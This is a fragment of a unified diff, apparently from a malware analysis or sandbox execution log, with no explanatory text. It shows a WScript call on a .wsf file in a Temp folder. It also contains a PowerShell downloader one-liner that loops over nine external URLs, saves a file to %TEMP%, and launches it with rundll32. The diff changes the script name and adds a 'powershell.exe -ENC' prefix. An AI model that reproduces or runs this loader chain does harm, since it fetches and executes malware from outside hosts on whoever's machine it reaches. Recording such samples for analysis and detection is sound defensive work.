@@ -11,9 +11,9 @@
 
 Exec >
 
-WScript.exe C:\Users\Admin\AppData\Local\Temp\YYJisvOrTyh4ipuSPcPktI6PJnQAc12G81Gew.wsf
+WScript.exe C:\Users\Admin\AppData\Local\Temp\AprilDetails(Zs5085).wsf"
 
-Start-Sleep -Seconds 4;$spearheadsWorseness = ("https://propertynear.co.uk/QyYWyp/XRgRWEdFv,https://graficalevi.com.br/0p6P/R94icuyQ,http://rosewoodlaminates.com/hea/yWY9SJ4VOH,https://chimpcity.com/h7e/p5FuepRZjx,https://kmphi.com/FWovmB/8oZ0BOV5HqEX,https://theshirtsummit.com/MwBGSm/lGP5mGh,https://capitalperurrhh.com/vQ1iQg/u6oL8xlJ,https://agtendelperu.com/FPu0Fa/EpN5Xvh,https://centerkick.com/IC5EQ8/2v6u6vKQwk8").split(",");foreach ($banteredCorneosclerotic in $spearheadsWorseness) {try {wget $banteredCorneosclerotic -TimeoutSec 20 -O $env:TEMP\nonnitrogenous.imbrueLownesses;if ((Get-Item $env:TEMP\nonnitrogenous.imbrueLownesses).length -ge 100000) {start rundll32 $env:TEMP\\nonnitrogenous.imbrueLownesses,X555;break;}}catch {Start-Sleep -Seconds 4;}}
+powershell.exe" -ENC  Start-Sleep -Seconds 4;$spearheadsWorseness = ("https://propertynear.co.uk/QyYWyp/XRgRWEdFv,https://graficalevi.com.br/0p6P/R94icuyQ,http://rosewoodlaminates.com/hea/yWY9SJ4VOH,https://chimpcity.com/h7e/p5FuepRZjx,https://kmphi.com/FWovmB/8oZ0BOV5HqEX,https://theshirtsummit.com/MwBGSm/lGP5mGh,https://capitalperurrhh.com/vQ1iQg/u6oL8xlJ,https://agtendelperu.com/FPu0Fa/EpN5Xvh,https://centerkick.com/IC5EQ8/2v6u6vKQwk8").split(",");foreach ($banteredCorneosclerotic in $spearheadsWorseness) {try {wget $banteredCorneosclerotic -TimeoutSec 20 -O $env:TEMP\nonnitrogenous.imbrueLownesses;if ((Get-Item $env:TEMP\nonnitrogenous.imbrueLownesses).length -ge 100000) {start rundll32 $env:TEMP\\nonnitrogenous.imbrueLownesses,X555;break;}}catch {Start-Sleep -Seconds 4;}}
 
 
 *************************************************
